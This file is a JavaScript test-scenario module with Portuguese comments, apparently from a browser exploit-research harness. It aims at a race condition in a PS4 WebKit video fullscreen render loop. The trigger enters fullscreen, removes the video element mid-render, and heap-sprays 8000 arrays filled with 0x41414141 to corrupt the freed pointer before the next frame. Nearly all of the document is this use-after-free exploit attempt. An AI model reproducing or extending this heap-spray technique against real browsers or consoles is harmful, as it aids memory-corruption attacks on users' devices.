
/**
 * CENÁRIO: VIDEO_FULLSCREEN_RENDER_LOOP_CRASH
 * Alvo: Race condition no ciclo de renderização gráfica (Manx) a 60FPS.
 */

export default {
    id:       'VIDEO_FULLSCREEN_RENDER_LOOP_CRASH',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Aplica a Teoria do Leandro: Entra em Fullscreen, aguarda o render loop ' +
                 'estabilizar e faz o remove() seguido IMEDIATAMENTE de Spray, ' +
                 'tentando corromper o ponteiro antes que a placa gráfica desenhe o próximo frame.',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.video.controls = true;
        this.container.appendChild(this.video);

        // A munição: 0x41414141 (AAAA - O Gatilho do Crash)
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // 1. A ENTRADA
            // Forçamos o método nativo da Apple/Sony
            if (this.video.webkitEnterFullscreen) {
                this.video.webkitEnterFullscreen();
            } else if (this.video.webkitRequestFullscreen) {
                this.video.webkitRequestFullscreen();
            }
            
            // 2. A ESTABILIZAÇÃO
            // Esperamos 300ms. Isto garante que a tela preta abriu, o Manx assumiu 
            // o controlo e está a desenhar o vídeo ativamente a 60 frames por segundo.
            await new Promise(r => setTimeout(r, 300)); 

            // 3. A REMOÇÃO (A sua intuição)
            this.video.remove();

            // 4. A CORRIDA CONTRA O FRAME (Spray)
            // O ecrã da PS4 atualiza a cada ~16ms. Temos de encher a RAM de lixo 
            // ANTES que o Manx tente procurar a imagem do vídeo para o próximo frame!
            this.spray = [];
            for (let i = 0; i < 8000; i++) { // Aumentei a carga para ser implacável
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

            // ZERO chamadas de saída. Deixamos o Manx bater na parede de lixo a 100km/h.

        } catch(e) {}
    },

    probe: [
        s => s.video.readyState,
        s => s.video.webkitDecodedFrameCount
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
        this.spray = null;
        this.video = null;
    }
};
